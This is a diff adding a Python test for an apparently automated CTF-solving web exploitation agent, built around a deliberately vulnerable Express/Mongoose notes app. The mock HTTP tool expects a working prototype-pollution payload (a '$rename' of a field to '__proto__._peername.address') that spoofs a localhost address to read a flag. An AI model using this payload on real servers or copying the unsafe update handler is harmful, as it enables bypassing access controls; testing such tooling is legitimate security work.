@@ -569,6 +569,81 @@ def test_web_agent_solves_leaked_jwt_comment_chat_api():
     assert http.posts
 
 
+def test_web_agent_solves_mongoose_socket_prototype_pollution_from_source(tmp_path):
+    source_dir = tmp_path / "secure_notes"
+    source_dir.mkdir()
+    (source_dir / "package.json").write_text(
+        json.dumps({"dependencies": {"express": "^4.18.2", "mongoose": "^7.2.4"}}),
+        encoding="utf-8",
+    )
+    (source_dir / "app.js").write_text(
+        '''
+const express = require('express');
+const app = express();
+app.get('/flag', (req, res) => {
+  if (req.connection.remoteAddress === '127.0.0.1') res.send(process.env.FLAG);
+  else res.status(403).send('denied');
+});
+app.post('/create', async (req, res) => res.json(await Note.create(req.body)));
+app.post('/update', async (req, res) => {
+  await Note.findByIdAndUpdate(req.body.noteId, req.body);
+  res.json({ok: true});
+});
+app.get('/get/:noteId', async (req, res) => res.json(await Note.findOne({_id: req.params.noteId})));
+''',
+        encoding="utf-8",
+    )
+
+    class SecureNotesHttpTool:
+        def __init__(self):
+            self.calls = []
+
+        def fetch(self, url, **kwargs):
+            self.calls.append((url, kwargs))
+            path = url.replace("https://notes.test", "")
+            if path == "/create":
+                assert kwargs["json_data"]["title"] == "127.0.0.1"
+                body = '{"_id":"507f1f77bcf86cd799439011"}'
+            elif path == "/update":
+                assert kwargs["json_data"]["$rename"] == {
+                    "title": "__proto__._peername.address"
+                }
+                body = '{"ok":true}'
+            elif path == "/get/507f1f77bcf86cd799439011":
+                body = '{"content":"probe"}'
+            elif path == "/flag":
+                body = 'HTB{mongoose_internal_socket}'
+            else:
+                raise AssertionError(f"unexpected request: {url}")
+            return HttpFetchResult(url, url, kwargs.get("method", "GET"), 200, {}, body, 0.1)
+
+        def fetch_content(self, url, **kwargs):
+            return HttpContentResult(url, url, "GET", 404, {}, b"", 0.1)
+
+    class FailingBrowserTool(MockBrowserTool):
+        def snapshot(self, url, cookies=None):
+            raise AssertionError("source-guided Mongoose playbook should run before browser recon")
+
+    http = SecureNotesHttpTool()
+    agent = WebExploitationAgent(
+        browser_tool=FailingBrowserTool(),
+        http_tool=http,
+        dirsearch_tool=NoopDirsearchTool(),
+    )
+    result = agent.solve_challenge({
+        "id": "secure_notes",
+        "category": "web",
+        "description": "Only those who knock from inside may enter.",
+        "url": "https://notes.test",
+        "files": [str(source_dir)],
+    })
+
+    assert result["status"] == "solved"
+    assert result["flag"] == "HTB{mongoose_internal_socket}"
+    assert any("prototype-pollution playbook SUCCESS" in step for step in result["steps"])
+    assert result["artifacts"]["mongoose_prototype_pollution_attempt"]["captured_sensitive_values"] is False
+
+
 def test_web_agent_solves_client_side_hash_auth_impersonation():
     base = "https://intern-net.test"
     normal_hash = "$2b$12$normalnormalnormalnormalnormalnormalnormalnormalnormalno"
